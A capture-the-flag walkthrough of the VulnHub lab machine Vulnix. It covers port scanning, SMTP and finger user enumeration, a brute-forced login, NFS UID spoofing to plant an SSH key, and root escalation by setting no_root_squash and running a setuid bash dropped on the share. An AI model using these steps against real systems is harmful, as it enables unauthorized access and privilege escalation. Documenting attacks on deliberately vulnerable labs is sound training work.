# HackLAB: Vulnix

https://www.vulnhub.com/entry/hacklab-vulnix,48/

We do a netdiscover to find `192.168.1.102` and do an nmap scan

```
root@kali:~# nmap -sC -sV -p- -A --open -T4 192.168.1.102

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-13 14:11 BST
Nmap scan report for vulnix.home (192.168.1.102)
Host is up (0.00015s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
|_ssl-date: 2017-10-13T13:14:19+00:00; +6s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3       Dovecot pop3d
|_pop3-capabilities: TOP STLS UIDL RESP-CODES SASL CAPA PIPELINING
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2017-10-13T13:14:20+00:00; +5s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      39802/udp  mountd
|   100005  1,2,3      45606/tcp  mountd
|   100021  1,3,4      36077/tcp  nlockmgr
|   100021  1,3,4      38386/udp  nlockmgr
|   100024  1          43462/udp  status
|   100024  1          48825/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: more post-login IMAP4rev1 listed OK LOGINDISABLEDA0001 have capabilities Pre-login ENABLE LOGIN-REFERRALS IDLE SASL-IR ID STARTTLS LITERAL+
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2017-10-13T13:14:20+00:00; +5s from scanner time.
512/tcp   open  exec?
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 IMAP4rev1 listed OK more have post-login capabilities ENABLE LOGIN-REFERRALS IDLE SASL-IR Pre-login ID LITERAL+
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2017-10-13T13:14:18+00:00; +5s from scanner time.
995/tcp   open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: TOP UIDL RESP-CODES USER SASL(PLAIN) CAPA PIPELINING
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2017-10-13T13:14:18+00:00; +5s from scanner time.
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
36077/tcp open  nlockmgr   1-4 (RPC #100021)
45606/tcp open  mountd     1-3 (RPC #100005)
48825/tcp open  status     1 (RPC #100024)
54441/tcp open  mountd     1-3 (RPC #100005)
57380/tcp open  mountd     1-3 (RPC #100005)
MAC Address: 00:0C:29:91:63:5F (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5s, deviation: 0s, median: 4s

TRACEROUTE
HOP RTT     ADDRESS
1   0.15 ms vulnix.home (192.168.1.102)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.53 seconds
```

We do some more enumeration, e.g. enum4linux shows no results, smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.102 gives us some useful folders and users, NTF showmount need to `sudo apt install nfs-common`. We can also confirm users through finger, e.g. user/s, vulnix, etc.

```
root@kali:~# mkdir /tmp/nfs
root@kali:~# mount -t nfs 192.168.1.102:/home/vulnix /tmp/nfs -nolock
root@kali:~# cd /tmp/nfs
bash: cd: /tmp/nfs: Permission denied

(probably due to root_squash flag is set)
```

### NFS mount
With confirmed usernames we can bruteforce to find our first login user:letmein. The idea now is if we can gain access to vulnix shared folder to /home/vulnix/, we can put our ssh authorized key. To do that we need to get the same uid to access the NFS we had earlier.

```
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
user@vulnix:~$ logout
Connection to 192.168.1.102 closed.
root@kali:~# useradd -u 2008 vulnix
root@kali:~# mkdir /tmp/mnt
root@kali:~# mount -t nfs 192.168.1.102:/home/vulnix /tmp/nfs -nolock
root@kali:~# su vulnix
$ cd /tmp/nfs
$ ls -lah
total 20K
drwxr-x---  2 nobody 4294967294 4.0K Sep  2  2012 .
drwxrwxrwt 15 root   root       4.0K Oct 13 14:47 ..
-rw-r--r--  1 nobody 4294967294  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 nobody 4294967294 3.5K Apr  3  2012 .bashrc
-rw-r--r--  1 nobody 4294967294  675 Apr  3  2012 .profile

root@kali:~# ssh-keygen
root@kali:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQvJaK1OKyJYlJKU6CV1PWxZMcLIcMw51qhThzfuL4XSbbpeYQuEnCVAIfvr+WY8ZghNS2FKsUiQt2RdfPkn/PAVrIdepSuZwLbUfsWh7DyL6Cohx+mK6F5BIVwy98E9vRsdiQq4FwEJ8i+NGhqGrug8noCKgDyjmk5nmfSVb96kHG8r+x3v3AOvSokHTJLtY/ZZpyE2oyBPd1ewwgu/3tk1QwJmD0smYpeoKJw8AaigvbZhfw3I5IU8phWDAZ7eRacgpYn99DbPh9ZawMkqJtO3Y4u1ngB5cLrEMlCqAfcDs4na1haGETSRJihGyDYsDP/FlRDfZ6G91ocnQHZId

(optional $ bash)
$ cd /tmp/nfs
$ mkdir .ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQvJaK1OKyJYlJKU6CV1PWxZMcLIcMw51qhThzfuL4XSbbpeYQuEnCVAIfvr+WY8ZghNS2FKsUiQt2RdfPkn/PAVrIdepSuZwLbUfsWh7DyL6Cohx+mK6F5BIVwy98E9vRsdiQq4FwEJ8i+NGhqGrug8noCKgDyjmk5nmfSVb96kHG8r+x3v3AOvSokHTJLtY/ZZpyE2oyBPd1ewwgu/3tk1QwJmD0smYpeoKJw8AaigvbZhfw3I5IU8phWDAZ7eRacgpYn99DbPh9ZawMkqJtO3Y4u1ngB5cLrEMlCqAfcDs4na1haGETSRJihGyDYsDP/FlRDfZ6G91ocnQHZId > .ssh/authorized_keys

(may need to, if you overwrited your keys root@kali:~# ssh-add)
(Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa))
root@kali:~# ssh vulnix@192.168.1.102
```

### Privilege Escalation

Checking sudo -l we have root access to sudoedit, we can edit it to allow moving files by changing root_squash to no_root_squash and then restarting the VM for it to take effect as we do not have permission to restart the service.

```
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#  to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix *(rw,no_root_squash)
vulnix@vulnix:~$ exit
logout
Connection to 192.168.1.102 closed.

(restart the Vulnix VM)

root@kali:~# mount -t nfs 192.168.1.102:/home/vulnix /tmp/nfs -nolock
root@kali:~# cp /bin/bash /tmp/nfs/exploit
root@kali:~# chmod 4777 /tmp/nfs/exploit
vulnix@vulnix:~$ /home/vulnix/exploit
-bash: /home/vulnix/exploit: cannot execute binary file
vulnix@vulnix:~$ uname -a
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
(My Kali is 64bit, so bash doesnt work! Use a 32 bit VM)
vulnix@vulnix:~$ ./bash -p
./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)
bash-4.4# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
```
